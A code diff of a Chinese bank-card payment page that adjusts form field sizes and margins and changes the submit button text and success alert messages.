@@ -43,40 +43,40 @@ div {
 				<img src="/esay/static/img/zgyl.jpeg" width="100%" height="100%">
 			</div>
 			<div
-				style="width: 100%; height: 68%; display: flex; margin-top: 10px;">
+				style="width: 100%; height: 68%; display: flex; margin-top: 1px;">
 				<form style="width: 100%; height: 55%;">
 					<label style="margin-left: 30px;">订单编号</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 22px;border:0px;" id="ordernum"
+						style="width: 200px; height: 22px; margin: 3px;font-size: 20px;border:0px;" id="ordernum"
 						name="ordernum" value="" disabled><br>
 						<label style="margin-left: 30px;">订单金额</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 22px;border:0px;text-decoration: line-through;" id="amount"
+						style="width: 200px; height: 22px; margin: 3px;font-size: 20px;border:0px;text-decoration: line-through;" id="amount"
 						name="amount" value="" disabled><br>
 					<label style="margin-left: 30px;">支付金额</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 22px;border:0px;" id="realamount"
+						style="width: 200px; height: 22px; margin: 3px;font-size: 20px;border:0px;" id="realamount"
 						name="realamount" value="" disabled><br> <label
 						style="margin-left: 30px;">卡主姓名</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 18px;" id="name"
+						style="width: 200px; height: 30px; margin: 8px;font-size: 18px;" id="name"
 						name="name" value=""><br> <label
 						style="margin-left: 30px;">身份证号</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 18px;" id="pcardno"
+						style="width: 200px; height: 30px; margin: 8px;font-size: 18px;" id="pcardno"
 						name="pcardno" value=""><br> <label
 						style="margin-left: 30px;">银行卡号</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 18px;" id="cardno"
+						style="width: 200px; height: 30px; margin: 8px;font-size: 18px;" id="cardno"
 						name="cardno" value=""><br> <label
 						style="margin-left: 30px;">手机号码</label><input type="text"
-						style="width: 230px; height: 30px; margin: 8px;font-size: 18px;" id="mobile"
+						style="width: 200px; height: 30px; margin: 8px;font-size: 18px;" id="mobile"
 						name="mobile" value=""><br> <label
 						style="margin-left: 30px;">验证码&nbsp;&nbsp;&nbsp;&nbsp;</label><input
-						type="text" style="width: 100px; height: 30px; margin: 8px;font-size: 18px;"
+						type="text" style="width: 70px; height: 30px; margin: 8px;font-size: 18px;"
 						id="smscode" name="smscode" value="">
 					<button id="smsbtn" type="button"
-						style="border-radius: 10px; border-color: #476fce; background-color: #476fce; color: #000000; font-size: 16px; height: 36px; width: 115px">发送</button>
+						style="border-radius: 10px; border-color: #476fce; background-color: #476fce; color: #000000; font-size: 16px; height: 36px; width: 100px">发送</button>
 					<br>
 				</form>
 			</div>
-			<div id="btn-down"  style="width: 100%; height: 1%; display: flex; justify-content: center; align-items: center;">
+			<div id="btn-down"  style="width: 100%; height: 12%; display: flex; justify-content: center; align-items: center;">
 					<button id="sumbitbtn"  type="button"
-						style="border-radius: 12px; border-color: #047e78; background-color: #047e78; color: #FFFFFF; font-size: 22px; height: 50px; width: 350px;">
+						style="border-radius: 12px; border-color: #047e78; background-color: #047e78; color: #FFFFFF; font-size: 22px; height: 50px; width: 300px;">
 						确认支付</button>
 			</div>
 		</div>
@@ -192,7 +192,8 @@ div {
 				alert("验证码不能为空!");
 				return;
 			}
-			$("#sumbitbtn").text("支付中...");
+			$("#sumbitbtn").text("正在支付");
+			$("#sumbitbtn").attr("disabled", false);
 			$.ajax({
 				type : "POST",
 				dataType : "json",
@@ -205,7 +206,7 @@ div {
 				}),
 				success : function(data) {
 					if (data.code == 200) {
-						alert("支付成功!");
+						alert("请等待10秒,银证扣款验证中!");
 						window.location.href = backurl;
 					}else{
 						alert("支付失败,"+data.msg);
